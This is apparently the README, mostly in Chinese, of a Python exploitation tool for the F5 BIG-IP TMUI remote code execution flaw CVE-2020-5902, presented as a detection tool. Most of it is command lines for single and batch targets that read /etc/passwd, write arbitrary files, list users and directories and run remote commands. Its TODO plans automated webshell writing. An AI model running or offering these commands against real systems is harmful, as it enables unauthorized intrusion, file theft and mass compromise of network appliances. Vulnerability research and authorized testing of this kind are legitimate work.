F5 BIG-IP RCE（CVE-2020-5902）漏洞检测工具
==


# Summary

20200706，网上曝出F5 BIG-IP TMUI RCE漏洞。

F5 BIG-IP的TMUI组件（流量管理用户界面）存在认证绕过漏洞，该漏洞在于Tomcat解析的URL与request.getPathInfo()存在差异，导致可绕过权限验证，未授权访问TMUI模块所有功能，进而可以读取/写入任意文件，命令执行等。

详情参考[F5 BIG-IP TMUI RCE漏洞（CVE-2020-5902）重现及注意点 ](https://www.lsablog.com/networksec/penetration/f5-bigip-tmui-rce-cve-2020-5902-reproduce/)

本工具支持单IP检测，批量IP检测，可进行文件读写，列认证用户，列目录，远程命令执行和hsqldb认证绕过检测


# Quick start

pip install requests


## hlep

python f5-bigip-rce-cve-2020-5902.py -h

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce00.png)

## poc check

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --check

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce09.png)

## batch poc check

python f5-bigip-rce-cve-2020-5902.py -f 1-2-f5.txt --check -t 20 -s 10

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce10.png)

## read file

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --fileread "/etc/passwd"

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce01.png)

## save file

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --filepath "/tmp/xxx.txt" --filecontent "x"

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce02.png)

## list auth user

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --list-users

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce03.png)

## list directory

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --listdir "/tmp/"

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce04.png)

## RCE

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --rce id --still-exploit

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce05.png)

## batch RCE

python f5-bigip-rce-cve-2020-5902.py -f 1-2-f5.txt --rce whoami --still-exploit -s 15 -t 20

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce06.png)


## hsqldb bypass check

python f5-bigip-rce-cve-2020-5902.py -u "https://1.2.3.4" --bypass-hsqldb

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce07.png)

## batch hsqldb bypass check

python f5-bigip-rce-cve-2020-5902.py -f 1-2-f5.txt --bypass-hsqldb

![](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/raw/master/img/f5rce08.png)


# Note

**批量的IP尽量在开头加上http:\/\/或https:\/\/，如果没有协议，会默认加上http:\/\/**

条件允许的情况下建议加上--still-exploit参数，即使list auth user失败也进行rce，增加成功率。


# TODO

1. 多次发请求增加批量成功率，需要权衡效率问题

2. 集成hsqldb接口反序列化利用

3. 增加自动化写webshell


# Feedback
[issus](https://github.com/theLSA/f5-bigip-rce-cve-2020-5902/issues)
<br/>
[lsablog](https://www.lsablog.com/networksec/penetration/f5-bigip-tmui-rce-cve-2020-5902-reproduce/)
<br>
gmail：lsasguge196@gmail.com
<br/>
qq：2894400469@qq.com
